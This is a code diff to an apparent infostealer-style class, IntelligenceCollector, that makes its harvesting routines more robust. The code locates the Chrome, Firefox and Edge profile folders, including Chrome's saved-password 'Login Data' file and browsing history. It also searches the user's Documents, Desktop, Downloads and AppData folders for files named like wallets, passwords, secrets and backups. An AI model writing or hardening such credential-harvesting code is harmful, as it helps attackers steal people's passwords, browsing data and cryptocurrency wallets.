@@ -216,37 +216,43 @@ class IntelligenceCollector:
         browsers = {}
         
         # Chrome
-        chrome_path = os.path.join(
-            os.getenv('LOCALAPPDATA'),
-            r'Google\Chrome\User Data\Default'
-        )
-        if os.path.exists(chrome_path):
-            browsers['chrome'] = {
-                'path': chrome_path,
-                'history': os.path.join(chrome_path, 'History'),
-                'bookmarks': os.path.join(chrome_path, 'Bookmarks'),
-                'login_data': os.path.join(chrome_path, 'Login Data')
-            }
+        local_app_data = os.getenv('LOCALAPPDATA', '')
+        app_data = os.getenv('APPDATA', '')
+        
+        if local_app_data:
+            chrome_path = os.path.join(
+                local_app_data,
+                r'Google\Chrome\User Data\Default'
+            )
+            if os.path.exists(chrome_path):
+                browsers['chrome'] = {
+                    'path': chrome_path,
+                    'history': os.path.join(chrome_path, 'History'),
+                    'bookmarks': os.path.join(chrome_path, 'Bookmarks'),
+                    'login_data': os.path.join(chrome_path, 'Login Data')
+                }
         
         # Firefox
-        firefox_path = os.path.join(
-            os.getenv('APPDATA'),
-            r'Mozilla\Firefox\Profiles'
-        )
-        if os.path.exists(firefox_path):
-            browsers['firefox'] = {
-                'path': firefox_path
-            }
+        if app_data:
+            firefox_path = os.path.join(
+                app_data,
+                r'Mozilla\Firefox\Profiles'
+            )
+            if os.path.exists(firefox_path):
+                browsers['firefox'] = {
+                    'path': firefox_path
+                }
         
         # Edge
-        edge_path = os.path.join(
-            os.getenv('LOCALAPPDATA'),
-            r'Microsoft\Edge\User Data\Default'
-        )
-        if os.path.exists(edge_path):
-            browsers['edge'] = {
-                'path': edge_path
-            }
+        if local_app_data:
+            edge_path = os.path.join(
+                local_app_data,
+                r'Microsoft\Edge\User Data\Default'
+            )
+            if os.path.exists(edge_path):
+                browsers['edge'] = {
+                    'path': edge_path
+                }
         
         return browsers
     
@@ -258,12 +264,18 @@ class IntelligenceCollector:
             'wallet*', 'password*', 'secret*', 'backup*'
         ]
         
-        locations = [
-            os.path.join(os.getenv('USERPROFILE'), 'Documents'),
-            os.path.join(os.getenv('USERPROFILE'), 'Desktop'),
-            os.path.join(os.getenv('USERPROFILE'), 'Downloads'),
-            os.path.join(os.getenv('APPDATA')),
-        ]
+        user_profile = os.getenv('USERPROFILE', '')
+        app_data = os.getenv('APPDATA', '')
+        
+        locations = []
+        if user_profile:
+            locations.extend([
+                os.path.join(user_profile, 'Documents'),
+                os.path.join(user_profile, 'Desktop'),
+                os.path.join(user_profile, 'Downloads'),
+            ])
+        if app_data:
+            locations.append(app_data)
         
         files = []
         for location in locations:
